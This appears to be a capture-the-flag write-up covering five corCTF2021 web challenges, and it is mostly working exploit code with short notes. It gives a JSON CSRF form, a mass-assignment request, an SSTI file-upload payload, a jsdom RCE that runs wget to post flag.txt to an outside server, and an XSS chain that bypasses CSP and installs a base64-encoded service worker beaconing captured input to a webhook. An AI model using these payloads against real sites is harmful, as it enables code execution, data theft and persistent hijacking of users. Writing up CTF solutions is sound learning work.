# corCTF2021

Some web challs are really nice :)

## phpme

json csrf


```php
<form action="https://phpme.be.ax/" method="POST" id="form" enctype="text/plain">
    <input name='{"yep":"yep yep yep", "url":"https://webhook.site/ae3fe73f-3566-4bbf-aa5e-437f4dcba4e1", "test":"' value='test"}'>
</form>
<script>form.submit()</script>
```


## buyme

overwrite of use because of extended params.

```python
import requests

url = 'https://buyme.be.ax/api/buy'

cookies = {
    'user':'s%3Abyc.rhpVWKComhkSp1DMO2mjm8J3eC5jrzQs5lz%2BD6rF4dU'
}
r = requests.post(f"{url}", cookies=cookies, json = {
    'flag':'corCTF',
    'user': {
        'user':'byc',
        'flags': [],
        'money':'1e+400',
        'pass':'123'
    }
}, allow_redirects=False)
print(r.text)
```

## drinkme

file overwrite under `/app`. So put ssti code to the html.


```python
files =[ ('file', ('.html', "001JKH{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat /var/flag')['read']()}}"))]
url = 'https://45395.drinkme.be.ax/'
r = requests.post('https://45395.drinkme.be.ax/upload',files=files, data={
    'type':'../templates/'
})
print(r.text)
```

## readme

jsdom eval => RCE


```html
<html>
<body>
<button 
 class="nextpoc" onclick="constructor.constructor('return process')().mainModule.require('child_process').execSync('wget -q -O- VPS_IP --post-data $(cat flag.txt)').toString();">
POC
</button>
Here's bunch of text;
</body>
</html>
```


## blogme

First, we need to get xss, but there is a CSP blocking: `object-src 'none'; script-src 'self' 'unsafe-eval';`.
But it is hard to get xss unless we have in-site library......

After the contest, the author notice that he put a hint about Cloudfare in the admin notice but I didn't check it all the time :(

So it will be clear if you find that there are multiple scripts under `/cdn-cgi/scripts/` and can be used to bypass CSP.

xss payload:

```html
<form id=_cf_translation><img id=lang-selector name=blobs><output id=locale><script>eval(name)</script></output></form><a data-translate=value></a><script src=/cdn-cgi/scripts/zepto.min.js></script><script src=/cdn-cgi/scripts/cf.common.js></script><script src=/cdn-cgi/scripts/cf.common.js></script>
```

To bypass the length limit, one common solution is to use redirects and let window.name serve as the payload.

Now actually the last part of challenge is quite clear for me since I know that service worker can be seen as browser proxy. The flag can only be
intercepted after the bot visiting our xss page. So to maintain the influence of xss, we need service worker. Simply return a page that sends data to 
our webhook is simple.

However, we still needs to upload javascript code to that site but only admin can upload files with `application/javascript` mimeTypes. So we need to
upload it with xss. Also the site has csrf protection in `/upload` route, so my solution is : fetch and get the upload url with csrftoken, then 
upload using fetch.


final payload

* step1: create a redirect post page, serve a payload page that uploads service worker on  webhook, and the actual xss post page.

redirect post page at `/post/50788f24-2ab2-4499-a5c8-bd64d24d8288`

`<meta http-equiv="refresh" content="0;URL='https://webhook.site/ae3fe73f-3566-4bbf-aa5e-437f4dcba4e1'" />`


```html
<script>
    name = `const sendMessage = (msg) => {
            navigator.sendBeacon('https://webhook.site/ae3fe73f-3566-4bbf-aa5e-437f4dcba4e1', msg);
        }

        const upload = (formData, url) => {
            fetch(url, {
                method: 'POST',
                body: formData
            })
                .then(response => response.text())
                .then(result => {
                    console.log('Success:', result);
                    sendMessage(result)
                })
                .catch(error => {
                    console.error('Error:', error);
                    sendMessage(error);
                });
        };

        const getCsrfToken = async () => {
            resp = await (await fetch("https://blogme.be.ax/profile")).text()
            const parser = new DOMParser();
            const htmlDocument = parser.parseFromString(resp, "text/html");
            return htmlDocument.documentElement.querySelector("body > div:nth-child(4) > div.card-body > form").action;
        }

        getCsrfToken().then(url => {
            const formData = new FormData();
            const content = window.atob('c2VsZi5hZGRFdmVudExpc3RlbmVyKCdmZXRjaCcsIChlKSA9PiB7DQogICAgaWYgKGUucmVxdWVzdC5tZXRob2QgPT0gJ0dFVCcgJiYgZS5yZXF1ZXN0LnVybC5pbmNsdWRlcygnL2FwaS9jb21tZW50LycpKSB7DQogICAgICAgIGUucmVzcG9uZFdpdGgoDQogICAgICAgICAgICBuZXcgUmVzcG9uc2UoYDxodG1sPjxib2R5Pjx0ZXh0YXJlYSBuYW1lPSJ0ZXh0Ij48L3RleHRhcmVhPjxidXR0b24gY2xhc3M9J2J0biBidG4tcHJpbWFyeSBtdC0zIGZsb2F0LWVuZCcgdHlwZT0nc3VibWl0JyBvbmNsaWNrPSduYXZpZ2F0b3Iuc2VuZEJlYWNvbigiaHR0cHM6Ly93ZWJob29rLnNpdGUvYWUzZmU3M2YtMzU2Ni00YmJmLWFhNWUtNDM3ZjRkY2JhNGUxIiwgZG9jdW1lbnQucXVlcnlTZWxlY3RvcigidGV4dGFyZWEiKS52YWx1ZSknPkNvbW1lbnQ8L2J1dHRvbj48L2JvZHk+PC9odG1sPmAsIHsNCiAgICAgICAgICAgICAgICBoZWFkZXJzOiB7DQogICAgICAgICAgICAgICAgICAgICdjb250ZW50LXR5cGUnOiAndGV4dC9odG1sJywNCiAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgfSkNCiAgICAgICAgKTsNCiAgICB9IGVsc2Ugew0KICAgICAgICByZXR1cm47DQogICAgfQ0KfSk7DQo=');
            const blob = new Blob([content], { type: "application/javascript" });
            formData.append("file", blob);
            upload(formData, url);
        });`
    location = "https://blogme.be.ax/post/3533b4ca-cd2d-4a44-9755-b585822edd88"
</script>
```

The service worker is encoded as base64 with original content as :
```javascript
self.addEventListener('fetch', (e) => {
    if (e.request.method == 'GET' && e.request.url.includes('/api/comment/')) {
        e.respondWith(
            new Response(`<html><body><textarea name="text"></textarea><button class='btn btn-primary mt-3 float-end' type='submit' onclick='navigator.sendBeacon("https://webhook.site/ae3fe73f-3566-4bbf-aa5e-437f4dcba4e1", document.querySelector("textarea").value)'>Comment</button></body></html>`, {
                headers: {
                    'content-type': 'text/html',
                },
            })
        );
    } else {
        return;
    }
});
```
and the xss payload page at `post/3533b4ca-cd2d-4a44-9755-b585822edd88`

```html
<form id=_cf_translation><img id=lang-selector name=blobs><output id=locale><script>eval(name)</script></output></form><a data-translate=value></a><script src=/cdn-cgi/scripts/zepto.min.js></script><script src=/cdn-cgi/scripts/cf.common.js></script><script src=/cdn-cgi/scripts/cf.common.js></script>
```

* step2:

get the file id and change our js payload on webhook. Just install the service worker and we got the flag :)

```html
<script>
    name = `const sendMessage = (msg) => {
            navigator.sendBeacon('https://webhook.site/ae3fe73f-3566-4bbf-aa5e-437f4dcba4e1', msg);
        }
        window.addEventListener("load", () => {
        const sw = "https://blogme.be.ax/api/file?id=97a982aa-a60a-42ce-8475-f6176fc8c3c4";
        navigator.serviceWorker.register(sw, { scope: '/api/' })
            .then((register) => {
                console.log("Success");
                sendMessage("Success")
            }, (err) => {
                console.log("Failed");
                sendMessage(err);
            });
    });`
    location = "https://blogme.be.ax/post/3533b4ca-cd2d-4a44-9755-b585822edd88"
</script>
```

![](https://hackmd.summershrimp.com/uploads/upload_72ed6816ca8c566b754d3865cf77efc2.bmp)
